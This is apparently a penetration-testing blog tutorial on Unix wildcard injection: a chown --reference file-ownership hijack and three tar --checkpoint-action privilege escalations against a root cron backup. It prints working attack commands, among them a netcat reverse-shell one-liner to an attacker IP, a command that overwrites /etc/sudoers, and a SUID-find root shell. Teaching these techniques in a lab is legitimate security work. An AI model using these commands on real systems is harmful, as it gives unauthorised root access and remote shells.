<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Exploiting Wildcard for Privilege Escalation</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/" rel="bookmark"><time class="entry-date published" datetime="2018-06-23T12:10:49+00:00">June 23, 2018</time><time class="updated" datetime="2025-06-08T13:16:18+00:00">June 8, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this article, we will cover “Wildcard Injection” an interesting old-school UNIX hacking technique, which is still a successful approach for Post exploitation and even many security-related folks haven’t heard of it. Here you will get surprised after perceiving some UNIX tools like ‘tar’ or ‘chown’ can lead to full system compromise.</span></p>
<h3 class="ai-optimize-7"><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li class="ai-optimize-8"><span style="color: #000000;">Introduction</span></li>
<li class="ai-optimize-9"><span style="color: #000000;">Wildcard</span></li>
<li class="ai-optimize-10"><span style="color: #000000;">Wildcard wildness example 1</span></li>
<li class="ai-optimize-11"><span style="color: #000000;">File hijacking example 2</span></li>
<li class="ai-optimize-12"><span style="color: #000000;">Post Exploitation via tar (Phase I)</span></li>
<li class="ai-optimize-13"><span style="color: #000000;">Tar Wildcard Injection (1st method)</span></li>
<li class="ai-optimize-14"><span style="color: #000000;">Post Exploitation via tar (Phase II)</span></li>
<li class="ai-optimize-15"><span style="color: #000000;">Tar Wildcard Injection (1st method)</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">Tar Wildcard Injection (2nd method)</span></li>
<li class="ai-optimize-17"><span style="color: #000000;">Tar Wildcard Injection (3rd method)</span></li>
</ul>
<p class="ai-optimize-18"><span style="color: #000000;"><strong>Let’s Start!!!</strong></span></p>
<h3 class="ai-optimize-19"><span style="color: #800000;">Wildcard</span></h3>
<p class="ai-optimize-20"><span style="color: #000000;">The wildcard is a character or set of characters that can be used as a replacement for some range/class of characters. Wildcards are interpreted by the shell before any other action is taken.</span></p>
<p class="ai-optimize-21"><strong><span style="color: #000000;">Some Wildcards character:</span></strong></p>
<p class="ai-optimize-22"><span style="color: #000000;"><strong>*</strong>     An asterisk matches any number of character in a filename, including none.</span></p>
<p class="ai-optimize-23"><span style="color: #000000;"><strong> ?</strong>     The question mark matches any single character.</span></p>
<p class="ai-optimize-24"><span style="color: #000000;"><strong>[ ]</strong>   Brackets enclose a set of characters, any one of which may match a single character at that position.</span></p>
<p class="ai-optimize-25"><span style="color: #000000;"> <strong>–  </strong>   A hyphen used within [ ] denotes a range of characters.</span></p>
<p class="ai-optimize-26"><span style="color: #000000;"><strong>~</strong>     A tilde at the beginning of a word expands to the name of your home directory. Append another user’s login name to the character, it refers to that user’s home directory.</span></p>
<p class="ai-optimize-27"><span style="color: #800000;"><strong>1<sup>st</sup> Example </strong></span></p>
<p class="ai-optimize-28"><span style="color: #000000;">You might be aware of wildcard symbol and their traditional usage but here we are presenting wildcard wildness and for this, I would like to draw your attention to the below steps.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /Desktop
mkdir wild
cd wild
echo "Hello Friends" &gt; file1
echo "This is Wildcard Injection" &gt; file2
echo "take help" &gt; --help</pre>
<p class="ai-optimize-29"><span style="color: #000000;">So as you can observe, here we have made a new directory “wild” on the desktop then with help of the echo command we have created 3 files and written 1 line in each file.</span></p>
<p class="ai-optimize-30"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-aNOs6VHwEW4/Wy4yZSdnuyI/AAAAAAAAXek/4gsiqBUoScAe1vqzQ2i5PWd_2hUFfrfVACEwYBhgL/s1600/1.1.png"/></span></p>
<p class="ai-optimize-31"><span style="color: #000000;">Afterwards, with help of the cat command, we try to open all the above 3 files as shown:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat file1
cat file 2
cat --help</pre>
<p class="ai-optimize-32"><span style="color: #000000;">However, the first two files opened normally and show the same information as written above. But the cat command failed to read information written inside –help file. Instead of showing “take help” while opening –help file it calls its own –help options from its own libraries &amp; such type of trick is called <strong>Wildcard wildness</strong>.</span></p>
<p class="ai-optimize-33"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-aEBHdou9cpU/Wy4yZvUHwVI/AAAAAAAAXgQ/sb4tiFcxRRM6RnAPxLPZtpMrCA1bnFX7QCEwYBhgL/s1600/1.2.png"/></span></p>
<h3 class="ai-optimize-34"><span style="color: #800000;">File owner hijacking via Chown</span></h3>
<p class="ai-optimize-35"><span style="color: #000000;">Similarly again we try to do something roguish with help of <strong>chown</strong> command. As we know it is an abbreviation of change owner, which is used on Unix-like systems to modify the ownership of file system files, directories and it may only be changed by a super-user. Let say we have three users in our system.</span></p>
<p class="ai-optimize-36"><span style="color: #000000;">Super-user (<strong>root</strong>) – perform an admin-level task such as run chown command.</span></p>
<p class="ai-optimize-37"><span style="color: #000000;">Non-root-user1 (<strong>raj</strong>) – perform ordinary jobs such as create file</span></p>
<p class="ai-optimize-38"><span style="color: #000000;">Non-root-user2 (<strong>aarti</strong>) – perform ordinary jobs such as create file</span></p>
<p class="ai-optimize-39"><span style="color: #000000;">Mischief-user (<strong>Ignite</strong>) – perform a notorious task such as the Chown file reference trick that can lead to file owner hijacking.</span></p>
<p class="ai-optimize-40"><span style="color: #000000;">In the following image, you can observe all the PHP file is owned by user: raj. Now when the user: ignite found all PHP file is own be user raj then he induces two PHP file himself in the same directory and uses file reference trick for file owner hijacking by executing below commands.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls -al
echo "" &gt; my.php
echo &gt; --reference=my.php</pre>
<p class="ai-optimize-41"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-9LX33vg4GDQ/Wy4yZkCeO6I/AAAAAAAAXgM/eI3TQ7LvuyQUSVsrVrmfwcNqn3Qqqok1wCEwYBhgL/s1600/1.3.png"/></span></p>
<p class="ai-optimize-42"><span style="color: #000000;">As you can notice, mostly file is owned by user: raj and the last two files are owned by user: ignite and when the super-user will be supposed to change ownership of all file having PHP extension with help of wildcard, then all files will indirectly come under the ownership of user: ignite.</span></p>
<p class="ai-optimize-43"><span style="color: #000000;">As you can observe when root user run chown command to give ownership to all the PHP files to the user: aarti, an error occurred and as result, the all PHP file get seized by user: ignite automatically.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">chown -R aarti:aarti *.php
ls -al</pre>
<h5 class="ai-optimize-44"><span style="color: #000000;"><strong>Conceptual Information:</strong></span></h5>
<p class="ai-optimize-45"><span style="color: #000000;">If you have ever explored tar to read its optional switches then you will find the following option.</span></p>
<p class="ai-optimize-46"><span style="color: #000000;"><strong>–reference=RFILE</strong> (use RFILE’s owner and group rather than specifying OWNER: GROUP values)</span></p>
<p class="ai-optimize-47"><span style="color: #000000;">In our case user: ignite executed the following commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo "" &gt; my.php
echo &gt; --reference=my.php</pre>
<p class="ai-optimize-48"><span style="color: #000000;">Then root user takes the help of the wildcard character for changing ownership. Thing is that the wildcard character used in ‘chown’ command line took the subjective ‘–reference=.my.php’ file and passed it to the chown command at the command line as an option.</span></p>
<p class="ai-optimize-49"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-b9cA7Ai6bxg/Wy4yaFRWkKI/AAAAAAAAXgY/V_Z8aGXCbXcTHruYX0oIsiWDlaQ_SEl4wCEwYBhgL/s1600/1.4.png"/></span></p>
<h3 class="ai-optimize-50"><span style="color: #800000;">Post Exploitation via tar (Phase I)</span></h3>
<p class="ai-optimize-51"><span style="color: #000000;"><strong>Lab-Setup</strong></span></p>
<p class="ai-optimize-52"><span style="color: #000000;">Likewise again we extend the wildness of wildcard character to the ultimate level and it was like a dynamic explosion in terms of system hacking.</span></p>
<p class="ai-optimize-53"><span style="color: #000000;">Tar is a very common UNIX program for creating and extracting archives. And with help of it, we are going to take a compress backup of any directory. For example, make a new directory and give ALL permission to it and then create some files.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir html
chmod 777 html
cd html
touch index.html
touch raj
touch file.txt</pre>
<p class="ai-optimize-54"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-REcPJzmUnrw/Wy4yaJOjmwI/AAAAAAAAXf8/9kCdJ-Gw8rQ7RLVSMTbuYeXCp7MXWFZ7wCEwYBhgL/s1600/1.png"/></span></p>
<p class="ai-optimize-55"><span style="color: #000000;">Now schedule a task with help of crontab to run tar archival program for taking backup of /html from inside /var/backups in every 1 minute.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/crontab
*/1 *   * * *   root tar -zcf /var/backups/html.tgz /var/www/html/*</pre>
<p class="ai-optimize-56"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-AyxeBLgnxPc/Wy4ydPEeVgI/AAAAAAAAXgg/-vhBlyxEK5ESW2zZXnGjN1I8OIDLPcYaACEwYBhgL/s1600/2.png"/></span></p>
<p class="ai-optimize-57"><span style="color: #000000;">Let’s verify the schedule is working or not by executing the following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /var/backup
ls</pre>
<p class="ai-optimize-58"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-Y6KPox2OEXA/Wy4ydSFKCfI/AAAAAAAAXgE/u34EpcYKHMIaIRSrT2DpKhnjGqQm50kYgCEwYBhgL/s1600/3.png"/></span></p>
<h3 class="ai-optimize-59"><span style="color: #800000;">Tar Wildcard Injection (1<sup>st</sup> method) </span></h3>
<p class="ai-optimize-60"><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<p class="ai-optimize-61"><span style="color: #000000;">Start your attacking machine and first compromise the target system and then move to the privilege escalation stage. Suppose I successfully login into the victim’s machine through ssh and access the non-root user terminal. Then open crontab to view if any job is scheduled.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /etc/crontab</pre>
<p class="ai-optimize-62"><span style="color: #000000;">Here we notice the target has scheduled a tar archival program for every 1 minute and we know that cron job runs as root. Let’s try to exploit.</span></p>
<p class="ai-optimize-63"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-ALzdcI0seL4/Wy4ydtsDN7I/AAAAAAAAXgU/ibH2NahxT-wyhNFtVbA73eIT1rCEjtAPQCEwYBhgL/s1600/4.png"/></span></p>
<p class="ai-optimize-64"><span style="color: #000000;">On a new terminal generate netcat reverse shell malicious code for achieving netcat reverse connection by using msfvenom and enter the following command for that.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.102 lport=8888 R</pre>
<p class="ai-optimize-65"><span style="color: #000000;">Copy the generated payload and paste it inside the victim’s shell as described below.</span></p>
<p class="ai-optimize-66"><span style="color: #000000;"><strong>nc -lvp 8888</strong></span></p>
<p class="ai-optimize-67"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-_v2Z6h1mZtw/Wy4ydjM3BfI/AAAAAAAAXgQ/7tIEuYRSQPIbQPjv1FZCISd8-95eTRAqQCEwYBhgL/s1600/5.png"/></span></p>
<p class="ai-optimize-68"><span style="color: #000000;">Now paste the above-copied payload as described below and ran the following commands inside the victim’s tty shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo "mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0&lt;/tmp/lhennp | /bin/sh &gt;/tmp/lhennp 2&gt;&amp;1; rm /tmp/lhennp" &gt; shell.sh
echo "" &gt; "--checkpoint-action=exec=sh shell.sh"
echo "" &gt; --checkpoint=1
tar cf archive.tar *</pre>
<p class="ai-optimize-69"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-yzOiHOko1H0/Wy4yd8dYSvI/AAAAAAAAXgM/Bo-5d1FkUTgm3foqjZFfI0YE_7Z0jka_wCEwYBhgL/s1600/6.png"/></span></p>
<p class="ai-optimize-70"><span style="color: #000000;">The above commands help the tar command to run the file shell.sh after the first file is archived. Since the tar command is running as root due to crontab, this has the effect of spawning a netcat shell and sending it to the attack platform on port 8888. And if you go back to the terminal window where the listener was on, you will have victim’s reverse connection in after 1 minute.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">id
whoami</pre>
<p class="ai-optimize-71"><span style="color: #000000;"><strong>Conceptual Information:</strong></span></p>
<p class="ai-optimize-72"><span style="color: #000000;">If you have ever explored tar to read its optional switches then you will find the following option.</span></p>
<p class="ai-optimize-73"><span style="color: #000000;"><strong>–checkpoint[=NUMBER] </strong>show progress messages every Numbers record (default 10)</span></p>
<p class="ai-optimize-74"><span style="color: #000000;"><strong>–checkpoint-action=ACTION </strong>execute ACTION on each checkpoint</span></p>
<p class="ai-optimize-75"><span style="color: #000000;">There is a ‘–checkpoint-action’ option, that will specify the program which will be executed when the checkpoint is reached. Mainly, this permits us to run an arbitrary command. Hence Options ‘–checkpoint=1’ and ‘–checkpoint-action=exec=sh shell.sh’ are handed to the ‘tar’ program as command-line options.</span></p>
<p class="ai-optimize-76"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-f7RK3fLz7Wg/Wy4yeTLp10I/AAAAAAAAXgc/mLSgGGl97kAMbrY4L0pjaYdwVDHuIOGVACEwYBhgL/s1600/7.png"/></span></p>
<h3 class="ai-optimize-77"><span style="color: #800000;">Post Exploitation via tar (Phase II)</span></h3>
<p class="ai-optimize-78"><span style="color: #000000;"><strong>Lab Setup</strong></span></p>
<p class="ai-optimize-79"><span style="color: #000000;">There are multiple ways to take compressed backup and multi techniques can also be applied for privilege escalation. In this phase, with help of tar, we are going to take a compress backup of a directory. For example, make a new directory whose backup you wish to take and give ALL permission to it and then create some files.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
mkdir data
chmod 777 data
cd data
echo "" &gt; f1
echo "" &gt; f2
echo "" &gt; f3
ls</pre>
<p class="ai-optimize-80"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-2pISut2VhcU/Wy4yesWI4iI/AAAAAAAAXgU/wEDVMlubTSMnbDSzRRTVd_CMHqiXiQ8DACEwYBhgL/s1600/8.png"/></span></p>
<p class="ai-optimize-81"><span style="color: #000000;">Now, in the other directory, write a bash script for taking backup of /tmp/data with help of tar archive program.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir info
cd info
nano script.sh
chmod 777 script.sh</pre>
<p class="ai-optimize-82"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-tmCJCuvklv8/Wy4ye0om65I/AAAAAAAAXgU/JA-b7s6GQYEEGD5Yz5dqLTQCzb3ckQ8KACEwYBhgL/s1600/9.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">#!/bin/bash
cd /tmp/data
tar cf /info/backup.tgz *</pre>
<p class="ai-optimize-83"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-Z1IWZDv6Jvg/Wy4yaecZnuI/AAAAAAAAXgQ/LqowF9_7BNUA9H5iH8pSn_kact8q46W4QCEwYBhgL/s1600/10.png"/></span></p>
<p class="ai-optimize-84"><span style="color: #000000;">Now schedule a task with help of crontab to run tar archival program for taking backup of /html inside /var/backups in every 1 minute.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/crontab
*/1 *   * * *   root    /info/script.sh</pre>
<p class="ai-optimize-85"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-tMQZT2zqPNI/Wy4yao0uODI/AAAAAAAAXgE/yB1XYj9UYlg4s97aXnx6Gwe1irwE2NYrQCEwYBhgL/s1600/11.png"/></span></p>
<p class="ai-optimize-86"><span style="color: #000000;">And after 1 minute you will notice the backup.tgz file is generated inside the info directory.</span></p>
<p class="ai-optimize-87"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-i7oV74f4PmQ/Wy4ya67SSaI/AAAAAAAAXgE/MQsqZ2-6Z-0fWJWObJW2gC8cc1LpOneIgCEwYBhgL/s1600/12.png"/></span></p>
<h3 class="ai-optimize-88"><span style="color: #800000;">Tar Wildcard Injection </span></h3>
<p class="ai-optimize-89"><span style="color: #000000;"><b style="color: #000000;">Inject netcat </b><span style="color: #000000;"><b>reverse</b></span><b style="color: #000000;"> _shell </b><b style="color: #000000;"> for Privilege Escalation</b></span></p>
<p class="ai-optimize-90"><span style="color: #000000;">Start your attacking machine and first compromise the target system and then move to the privilege escalation stage. Suppose I successfully login into the victim’s machine through ssh and access non-root user terminal. Then open crontab to view if any job is scheduled.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /etc/crontab</pre>
<p class="ai-optimize-91"><span style="color: #000000;">Here we notice the target has scheduled a bash program script for every 1 minute and we know that cron job runs as root. The minute attacker read the program written inside the script.sh, he can apply the tar wildcard injection.</span></p>
<p class="ai-optimize-92"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-MWto_BployQ/Wy4ybMF7sOI/AAAAAAAAXgE/T14QSmP99csxygcL6LoUhwoKxKHIh37OACEwYBhgL/s1600/13.png"/></span></p>
<p class="ai-optimize-93"><span style="color: #000000;">Again generate netcat reverse shell payload as done above.</span></p>
<p class="ai-optimize-94"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-wQDqcAvVluk/Wy4ybRkC68I/AAAAAAAAXf8/38-nzuIdz7E2CRSioN4oitFPYgY_THUwQCEwYBhgL/s1600/15.png"/></span></p>
<p class="ai-optimize-95"><span style="color: #000000;">And again repeat the above step as shown in the image.</span></p>
<p class="ai-optimize-96"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-M4dUJIQEPDI/Wy4ybjSXuUI/AAAAAAAAXgE/5cg-fe7u72c3oUnH6VEnvacJ_TSMi0ckACEwYBhgL/s1600/16.png"/></span></p>
<p class="ai-optimize-97"><span style="color: #000000;">Then get back to netcat shell for the victim’s reverse connection and you will notice after 1 minute you get victim’s netcat session.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">whoami
cd /root
pwd</pre>
<p class="ai-optimize-98"><span style="color: #000000;">Hence, the target can be easily exploited if he makes a usage tar archive program either by scheduling a job via command or through bash script.</span></p>
<p class="ai-optimize-99"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-6SsWohfgoeo/Wy4ycMLz12I/AAAAAAAAXgA/xmDPABxMCLk4FQboAazab4IDYNqY6T_pgCEwYBhgL/s1600/17.png"/></span></p>
<h3 class="ai-optimize-100"><span style="color: #800000;">Tar Wildcard Injection (2<sup>nd</sup> method)</span></h3>
<p class="ai-optimize-101"><span style="color: #000000;"><strong>Exploit Sudoers file for Privilege Escalation</strong></span></p>
<p class="ai-optimize-102"><span style="color: #000000;">Basically, with help wildcard injection an attack wants to gain the highest privilege of the system, therefore, he will try to inject some malicious code with help of tar for root access. But there are multiple ways to obtain root access and hence you can apply the following techniques for privilege escalation.</span></p>
<p class="ai-optimize-103"><span style="color: #000000;">Suppose you have victim’s machine as a non-root user and for privilege escalation either take root access or try to give sudo right to non-root user by adding him sudoers file. Thus you can take help of following commands.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo 'echo "ignite ALL=(root) NOPASSWD: ALL" &gt; /etc/sudoers' &gt; demo.sh
echo "" &gt; "--checkpoint-action=exec=sh demo.sh"
echo "" &gt; --checkpoint=1
tar cf archive.tar *</pre>
<p class="ai-optimize-104"><span style="color: #000000;">With the help of above command we had tried to give root permission to the user: ignite and for 1 minute. After 1 minute passed we successfully owned the root account.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l
sudo bash
whoami</pre>
<p class="ai-optimize-105"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-uPMOZswJTjg/Wy4yc5Fff9I/AAAAAAAAXgU/ccFKOiLDy50HwETU1EtQ8u2g5ACOFMLFACEwYBhgL/s1600/18.png"/></span></p>
<h3 class="ai-optimize-106"><span style="color: #800000;"><strong>Tar Wildcard Injection (3<sup>rd</sup> method)</strong></span></h3>
<p class="ai-optimize-107"><span style="color: #000000;"><b style="color: #000000;">Privilege Escalation-Give SUID permission to system binaries</b></span></p>
<p class="ai-optimize-108"><span style="color: #000000;">There are multiple ways for privilege escalation with help of tar injection but we are discussing very few methods among them. Suppose you have victim’s machine as the non-root user and for privilege escalation, you can try to enable SUID bit for any system binaries and likewise above again you can take help of the following command for obtaining root access.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo "chmod u+s /usr/bin/find" &gt; test.sh
echo "" &gt; "--checkpoint-action=exec=sh test.sh"
echo "" &gt; --checkpoint=1
tar cf archive.tar *
ls -al /usr/bin/find
find f1 -exec "whoami" \;
root
find f1 -exec "/bin/sh" \;
id
whoami</pre>
<p class="ai-optimize-109"><span style="color: #000000;">We hope you will enjoy these tricks while penetration testing.</span></p>
<p class="ai-optimize-110"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-O2lhkg-YydQ/Wy4yc4FoSkI/AAAAAAAAXgE/LHf2Z4NL9EgDQfHc5GdPAq8PNHUq3d76QCEwYBhgL/s1600/19.png"/></span></p>
<p class="ai-optimize-111"><span style="color: #000000;"><strong>Source: </strong><span style="color: #3366ff;">//www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt</span></span></p>
<p class="ai-optimize-6"><span style="color: #000000;">To Learn more about Privilege Escalation. Follow this</span> <a href="https://www.hackingarticles.in/category/privilege-escalation/">Link.</a></p>
<p class="ai-optimize-112"><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles, an Information Security Consultant, Social Media Lover, and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
